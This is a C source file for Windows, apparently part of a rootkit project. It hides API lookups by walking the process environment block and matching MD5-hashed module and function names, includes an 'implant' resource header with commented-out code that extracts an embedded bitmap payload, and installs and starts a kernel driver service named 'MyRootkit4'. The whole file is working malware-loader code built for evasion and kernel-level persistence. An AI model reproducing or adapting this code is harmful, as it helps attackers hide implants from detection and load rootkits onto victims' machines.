#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <Windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <psapi.h>
#include <shlobj_core.h>
#include <windows.h>

#pragma comment(lib, "Shlwapi.lib")

#include "implant_rsrc.h"
#include "resource.h"
#include "mdmain.h"

PEB* RtlGetCurrentPeb(VOID)
{
    return NtCurrentTeb()->ProcessEnvironmentBlock;
}

PVOID SelfGetModuleHandle(uint8_t name[16]) {

    PEB* pPeb = RtlGetCurrentPeb();
    PLIST_ENTRY current = pPeb->Ldr->InMemoryOrderModuleList.Flink;
    uint8_t* result = malloc(16);
    while ((current != NULL) && (current != &pPeb->Ldr->InMemoryOrderModuleList))//stackoverflow modification
    {
        LDR_DATA_TABLE_ENTRY* module = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);//stackoverflow modification
        wmd5String((wcsrchr(module->FullDllName.Buffer, L'\\') + 1), result);
        if (memcmp(result, name, 16) == 0) {
            printf("Base found !!!\n");
            return module->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

PVOID SelfGetProcAddress(HMODULE module, uint8_t name[16]) {
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((uint8_t*)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);//get imageNtHeader from DOS_HEADER (e_lfanew = logical file address) (entire dll relocated)
    PIMAGE_OPTIONAL_HEADER imageOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&NtHeaders->OptionalHeader; //getting closer of Export directory by reading OptionalHeader
    PIMAGE_DATA_DIRECTORY imageDataDirectory = &(imageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT/*winnt.h*/]);//first element (index0) of Optional header array is the export table
    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((uint8_t*)module + imageDataDirectory->VirtualAddress);//getting the RVA (Relative Virtual Adress)
    /*3 arrays of the same size */
    PDWORD exportAddressTable = (PDWORD)((uint8_t*)module + imageExportDirectory->AddressOfFunctions);//function address ( function rva)
    PWORD /*unsigned short*/ nameOrdinalsPointer = (PWORD)((uint8_t*)module + imageExportDirectory->AddressOfNameOrdinals);//contains the address of the function by the name
    PDWORD exportNamePointerTable = (PDWORD)((uint8_t*)module + imageExportDirectory->AddressOfNames);//pointer to the name 
    uint8_t* result = malloc(16);
    for (size_t nameIndex = 0; nameIndex < imageExportDirectory->NumberOfNames; nameIndex++)
    {
        char* exportname = (char*)((uint8_t*)module + exportNamePointerTable[nameIndex]);
        md5String(exportname, result);
        if (memcmp(result, name, 16) == 0) {
            DWORD ordinal = nameOrdinalsPointer[nameIndex];
            PDWORD targetFunctionAddress = (PDWORD)((uint8_t*)module + exportAddressTable[ordinal]);
            return targetFunctionAddress;
        }
    }
    return NULL;
}
/*
https://res.cloudinary.com/practicaldev/image/fetch/s--sMtYPRHi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ahb7ncw4rop0ogid77t2.png
*/

int main() {
 
    uint8_t ntdllHash[16] = { 0xa3,0xcb,0x33,0x79,0xad,0x0c,0xf1,0x93,0xfa,0xe7,0x5c,0xa4,0x71,0x86,0xc0,0x02 };

    HMODULE ntdllBase = (HMODULE)SelfGetModuleHandle(ntdllHash);

    /*
    uint8_t kernelhash[16] = { 0x31,0x0f,0x76,0x5e,0xda,0xab,0x10,0x80,0xde,0x41,0xdc,0x38,0xdd,0x3a,0x06,0x02 };
    HMODULE kerneldllBase = (HMODULE)SelfGetModuleHandle(kernelhash);
    if (kerneldllBase == NULL) {
        printf("Error KERNEL32.DLL doesnt exist");
        return 1;
    }
    if (ntdllBase == NULL) {
        printf("Error ntdll.dll doesnt exist\n");
    }
    else {
        POW pow = (POW)SelfGetProcAddress(ntdllBase, "\x30\xd7\xe0\x49\x43\x51\xde\xf4\x55\x91\xfc\xcb\x21\xd3\x51\x0b");
        printf("%f\n", pow(2.0, 3.0));
    }
    FINDRESSOURCEA FindResourceW_ = (FINDRESSOURCEA)SelfGetProcAddress(kerneldllBase, "\xfc\x44\x16\xe1\xc0\xc4\xc1\xf3\xbc\x9d\xbc\xb4\x3e\xae\x96\x3f");
    if (FindResourceW_ == NULL) {
        printf("Error FindRessourceW");
        return 1;
    }
    
    HRSRC BmpRessource = FindResourceW_(NULL, MAKEINTRESOURCE(IDB_BITMAP1), MAKEINTRESOURCE(2));

    LOADRESSOURCE LoadResource_ = (LOADRESSOURCE)SelfGetProcAddress(kerneldllBase, "\x88\x40\xae\xbf\xbc\x90\x05\xe6\xe3\x41\x86\x60\xfe\x3e\xf1\xb1");
    HGLOBAL GlobalRessource = LoadResource_(NULL, BmpRessource);
    if (!GlobalRessource) {
        printf("Global Ressource Error !!!");
        return 1;
    }
    SIZEOFRESSOURCE SizeofRessource_ = (SIZEOFRESSOURCE)SelfGetProcAddress(kerneldllBase, "\x75\xa4\xf2\xff\xef\x11\x13\x69\x1d\xdb\x91\xca\xfe\x19\x8a\x95");
    size_t FileSize = SizeofRessource_(NULL, BmpRessource);
    LOCKRESSOURCE LockResource_ = (LOCKRESSOURCE)SelfGetProcAddress(kerneldllBase, "\xe6\x77\x7c\x17\x5e\x59\xd6\xd2\xe5\x2d\x67\xc6\x1e\xf2\x66\x43");
    uint8_t* FilePtr = (uint8_t*)LockResource_(GlobalRessource);

    for (size_t i = 0; i < FileSize; i++)
    {
        printf("%x", FilePtr[i]);
    }
    printf("\nFinish !\n");
    */
    SC_HANDLE service, scm;
    SERVICE_STATUS status;

    scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("Impossible d'ouvrir le gestionnaire de contrôle des services. Erreur %d\n", GetLastError());
        return 1;
    }

    service = CreateServiceW(scm, L"MyRootkit4", L"MyRootkit4", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, L"C:\\Users\\user\\source\\repos\\ul2ecnirP\\MyRootkit\\x64\\Debug\\RootKitDriver.sys", NULL, NULL, NULL, NULL, NULL);
    if (!service) {
        printf("Impossible de charger le driver. Erreur %d\n", GetLastError());
        CloseServiceHandle(scm);
        return 1;
    }

    if (!StartService(service, 0, NULL)) {
        printf("Impossible de demarrer le driver. Erreur %d\n", GetLastError());
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return 1;
    }

    printf("Driver charge et demarre avec succes.\n");
    system("PAUSE");
    if (!ControlService(service, SERVICE_CONTROL_STOP, &status)) {
        printf("Impossible d'arreter le driver. Erreur %d\n", GetLastError());
    }

    if (!DeleteService(service)) {
        printf("Impossible de supprimer le driver. Erreur %d\n", GetLastError());
    }

    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    printf("Driver décharge avec succes.\n");

    return 0;
}